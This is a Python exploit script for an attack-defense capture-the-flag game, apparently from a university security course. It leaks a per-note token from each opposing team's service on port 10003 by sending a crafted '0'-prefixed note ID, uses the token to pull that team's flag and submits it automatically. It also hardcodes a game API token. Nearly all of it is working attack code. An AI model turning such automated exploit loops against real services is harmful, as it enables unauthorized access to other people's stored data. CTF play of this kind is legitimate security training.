from swpag_client import Team
import os
import sys
import json
import random
import string
from Crypto.PublicKey import RSA
import pwn

pwn.context.arch = 'amd64'
#pwn.context.log_level = 'debug'

t = Team("http://actf_team.cse545.io/", "zJIJuyswOWqyjCAznRUV")

tokens=[]
for team in t.get_targets(3):
    host=team['hostname']
    note_id=team['flag_id']
    p=pwn.remote(host,'10003')
    try:
        p.recvuntil('Type S')
        p.sendline('S')
        p.recvuntil('ones!')
        p.sendline('0'+note_id)
        p.recvline()
        p.recvline()
        singletoken=p.recvline()
        singletoken=singletoken.decode("utf-8").strip('\n')
        #print(singletoken)
        tokens.append(str(singletoken))
    except EOFError as error:
        continue

for team,token in zip(t.get_targets(3),tokens):
    host=team['hostname']
    note_id=team['flag_id']
    q=pwn.remote(host,'10003')
    try:
        q.recvuntil('Type S')
        q.sendline('R')
        q.recvuntil('note_id token')
        #print(note_id)
        #print(token)
        q.sendline(note_id + ' ' + token)
        q.recvuntil('FLG')
        flag=q.recv(13).decode("utf-8").strip('\n')
        flag="FLG" + flag
        #print(flag)
        status=t.submit_flag([flag])
        print(status)
    except EOFError as error:
        continue
